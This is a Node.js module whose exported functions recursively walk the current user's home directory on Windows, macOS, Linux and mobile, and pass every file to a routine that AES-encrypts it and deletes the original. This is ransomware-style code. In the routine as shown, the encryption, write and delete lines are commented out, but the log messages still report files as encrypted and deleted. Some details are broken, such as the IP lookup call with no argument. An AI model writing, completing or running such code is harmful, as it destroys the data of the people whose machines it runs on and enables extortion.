const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');
const requestIp = require('request-ip');

const algorithm = 'aes-256-cbc';
const key = 'myPrivateKey';

async function encryptFile(filePath, ipAddress, userAgent) {
  try {
    ipAddress = requestIp.getClientIp(); // get IP address of client
    console.log(`Encrypting file ${filePath} for client with IP address ${ipAddress} and user agent ${userAgent}`);

    // const fileData = await fs.readFile(filePath);
    // const cipher = crypto.createCipher(algorithm, key);
    // let encryptedData = cipher.update(fileData);
    // encryptedData = Buffer.concat([encryptedData, cipher.final()]);
    // const encryptedFilePath = `${filePath}.enc`;
    // await fs.writeFile(encryptedFilePath, encryptedData);
    // await fs.unlink(filePath);
    console.log(`Original file ${filePath} deleted.`);
  } catch (err) {
    console.error(`Error while encrypting file ${filePath}: ${err}`);
  }
}

async function traverseDirectory(directory, callback, ipAddress, userAgent) {
  try {
    const folderStats = await fs.stat(directory);
    if (!folderStats.isDirectory()) {
      return;
    }

    // Skip folders that require admin access
    if (os.platform() !== 'win32' || (folderStats.mode & 0o777) & 0o200) {
      const folderItems = await fs.readdir(directory);
      for (const item of folderItems) {
        const itemPath = path.join(directory, item);
        const itemStats = await fs.stat(itemPath);

        if (itemStats.isDirectory()) {
          await traverseDirectory(itemPath, callback, ipAddress, userAgent);
        } else if (itemStats.isFile()) {
          await callback(itemPath, ipAddress, userAgent);
        }
      }
    } else {
      console.log(`Skipping folder ${directory} as it requires admin access`);
    }
  } catch (err) {
    console.error(`Error while traversing directory ${directory}: ${err}`);
  }
}

async function encryptFilesInWindowsHomeDir(ipAddress, userAgent) {
  try {
    const homeDir = `C:/Users/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile, ipAddress, userAgent);
    console.log(`All files in Windows home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Windows home directory: ${err}`);
  }
}

async function encryptFilesInMacHomeDir(ipAddress, userAgent) {
  try {
    const homeDir = `/Users/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile, ipAddress, userAgent);
    console.log(`All files in Mac home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Mac home directory: ${err}`);
  }
}

async function encryptFilesInLinuxHomeDir(ipAddress, userAgent) {
  try {
    const homeDir = `/home/${os.userInfo().username}`;
    await traverseDirectory(homeDir, encryptFile, ipAddress, userAgent);
    console.log(`All files in Linux home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Linux home directory: ${err}`);
  }
}

async function encryptFilesInMobileHomeDir(ipAddress, userAgent) {
  try {
    const homeDir = `/var/mobile`;
    await traverseDirectory(homeDir, encryptFile, ipAddress, userAgent);
    console.log(`All files in Mobile home directory ${homeDir} encrypted.`);
  } catch (err) {
    console.error(`Error while encrypting files in Linux home directory: ${err}`);
  }
 }

 module.exports = {
  encryptFilesInWindowsHomeDir,
  encryptFilesInMacHomeDir,
  encryptFilesInLinuxHomeDir,
  encryptFilesInMobileHomeDir,
 }